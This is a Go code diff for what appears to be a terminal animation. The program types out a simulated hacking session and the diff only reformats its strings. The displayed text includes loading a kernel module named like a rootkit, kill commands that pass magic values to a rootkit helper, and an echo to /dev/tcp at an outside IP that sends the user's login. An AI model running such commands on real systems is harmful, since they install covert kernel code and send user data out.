@@ -260,7 +260,7 @@ func (p *Profile) login(_ context.Context) error {
 var prompt string = "\nhowosecurity@vds-73125908:~$ "
 
 func (p *Profile) prompt() {
-	p.term.Print("\nhowosecurity@vds-73125908:~$ ")
+	p.term.Print(prompt)
 	p.term.ShowCursor(true)
 	p.term.Frame(75)
 }
@@ -290,13 +290,15 @@ Total 2.5M
 	user := stats.User
 
 	p.term.Type("sudo insmod anakin.ko", terminal.Fast)
-	p.term.Print(`\n[sudo] password for howosecurity: `)
+	p.term.Print(`
+[sudo] password for howosecurity: `)
 	p.term.Frame(200)
 
 	p.prompt()
 	p.term.Frame(75)
 	p.term.Type(`kill -67 $(printf "%d" 0x$(echo -n help | xxd -p))`, terminal.Fast)
-	p.term.Print(`\nkill: kill 1751477360 failed: permission denied\n`)
+	p.term.Println(`
+kill: kill 1751477360 failed: permission denied`)
 
 	p.prompt()
 	p.term.Frame(50)
@@ -326,7 +328,8 @@ printf "%d" 0x$(printf "%.4s" "$1" | xxd -p)
 	p.term.Frame(75)
 
 	p.term.Type(`kill -67 $(./rk-helper root)`, terminal.Fast)
-	p.term.Println(`\nkill: kill 1919905652 failed: no such process`)
+	p.term.Println(`
+kill: kill 1919905652 failed: no such process`)
 
 	p.prompt()
 	p.term.Frame(75)
@@ -338,7 +341,7 @@ printf "%d" 0x$(printf "%.4s" "$1" | xxd -p)
 	p.prompt()
 	p.term.Frame(75)
 
-	p.term.Type(fmt.Sprintf(`echo "fetch %s" > /dev/tcp/4.228.31.150/443\n`, user.GetLogin()), terminal.Fast)
+	p.term.Type(fmt.Sprintf("echo \"fetch %s\" > /dev/tcp/4.228.31.150/443\n", user.GetLogin()), terminal.Fast)
 	p.term.ShowCursor(false)
 
 	p.term.Print("\nConnecting...")
